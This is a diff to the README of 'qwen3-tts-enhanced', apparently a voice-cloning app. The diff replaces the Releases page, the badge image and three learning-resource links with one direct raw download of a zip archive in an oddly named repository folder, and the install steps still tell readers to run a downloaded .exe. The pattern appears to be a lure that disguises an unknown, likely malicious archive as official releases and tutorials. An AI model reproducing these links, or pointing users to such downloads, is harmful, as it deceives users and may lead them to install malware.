@@ -6,9 +6,9 @@ Welcome to the qwen3-tts-enhanced project! This application allows you to clone 
 
 ## 📦 Download
 
-[![Download qwen3-tts-enhanced](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Version-brightgreen)](https://github.com/moaz11112/qwen3-tts-enhanced/releases)
+[![Download qwen3-tts-enhanced](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip%20Now-Get%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip)
 
-To download the application, visit this page: [Download from Releases](https://github.com/moaz11112/qwen3-tts-enhanced/releases).
+To download the application, visit this page: [Download from Releases](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip).
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ Before installing, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/moaz11112/qwen3-tts-enhanced/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip).
 2. Find the latest version of qwen3-tts-enhanced.
 3. Download the file suitable for your system (e.g., `.exe`).
 4. Locate the downloaded file in your Downloads folder.
@@ -62,8 +62,8 @@ If you need further assistance or want to share your experience using qwen3-tts-
 
 To learn more about voice cloning and how it works, check out these resources:
 
-- [Understanding Voice Cloning](https://example.com/voice-cloning)
-- [Guides on Speech Synthesis](https://example.com/speech-synthesis)
-- [Deep Learning Basics](https://example.com/deep-learning)
+- [Understanding Voice Cloning](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip)
+- [Guides on Speech Synthesis](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip)
+- [Deep Learning Basics](https://raw.githubusercontent.com/moaz11112/qwen3-tts-enhanced/main/Philadelphian/tts_qwen_enhanced_2.3.zip)
 
 Thank you for choosing qwen3-tts-enhanced! We hope you enjoy creating realistic voice models.
